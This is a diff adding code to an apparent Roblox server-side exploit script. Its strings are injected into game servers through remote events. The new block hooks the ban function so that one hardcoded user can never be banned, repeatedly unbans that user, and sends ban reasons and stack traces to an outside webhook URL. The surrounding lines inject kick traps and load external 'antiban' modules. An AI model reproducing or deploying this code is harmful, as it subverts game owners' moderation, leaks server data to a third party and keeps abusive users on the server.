@@ -2865,6 +2865,50 @@ end)
 			fireRemoteEvent('local r=Instance.new("RemoteEvent",game.JointsService)r.Name="_FEBYPASS32"r.OnServerEvent:Connect(function(p)p:Kick("Use c00lkidd ss you skid bozo!")end)')
 		        fireRemoteEvent('require(7458325257).antiban()')
 			fireRemoteEvent('require(3986243232).load("im a skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+fireRemoteEvent([[
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ID = 7713529650
+local URL = "https://l.webhook.party/hook/EUCAknZHMLmyb7kibkT40WOXav69ky34nx2xRlMSd%2BGODGX8aBG7pk4TppzUI22gG3%2F8M9CPR%2F9HcQfWEHmRGgiwfAdwwL4PWvKlqcJBWNDCS%2BVr%2FrLSY5MVCSsxTv3ZC%2BtPkINqOxGCl6NZkKJH4UTeqU69f9Tq8XDlap0TnVme6idorKCHGRsFYHamRm6vKzRTxJuEy7akL5RldChkb9NRQRl4ar5hLLnz24kqNigwZ1GuFa1ZuoOP9Oxs%2BNOgez0ELcK222LhUdQ5LMCVYnQY4ehXfgheBYIcOJKUZsrWK5eO9pauFEXVszVDHEfuj2OuprFaWT6PoUGYovpGlNUVCMqU%2BQOZLak4YTOIL%2BjHq1lQknd9tehdNpQ%2BWFWCTsqa9%2BT980U%3D/77du2b73gvP3q%2FXw"
+
+local function log(t, msg)
+	pcall(function()
+		HttpService:PostAsync(URL, HttpService:JSONEncode({
+			username = "banlog",
+			content = "type: " .. t .. " id: " .. ID .. " info: " .. msg .. " time: " .. os.date("%Y-%m-%d %H:%M:%S")
+		}), Enum.HttpContentType.ApplicationJson)
+	end)
+end
+
+local realBan = Players.BanAsync
+Players.BanAsync = function(self, cfg)
+	if cfg and type(cfg) == "table" and table.find(cfg.UserIds or {}, ID) then
+		local r = tostring(cfg.DisplayReason or "no reason")
+		local trace = tostring(debug.traceback()):sub(1, 400)
+		log("ban_blocked", "reason: " .. r .. " trace: " .. trace)
+		task.defer(function()
+			pcall(function()
+				Players:UnbanAsync({UserIds = {ID}, ApplyToUniverse = true})
+			end)
+		end)
+		return
+	end
+	return realBan(self, cfg)
+end
+
+Players.BanStatusChanged:Connect(function(uid, status)
+	if uid == ID and status == Enum.BanStatus.Banned then
+		log("ban_event", "BanStatusChanged triggered")
+		pcall(function()
+			Players:UnbanAsync({UserIds = {ID}, ApplyToUniverse = true})
+		end)
+	end
+end)
+
+pcall(function()
+	Players:UnbanAsync({UserIds = {ID}, ApplyToUniverse = true})
+end)
+]])
 			-- Layered protection
 			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.ReplicatedStorage;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
 			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.Workspace;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
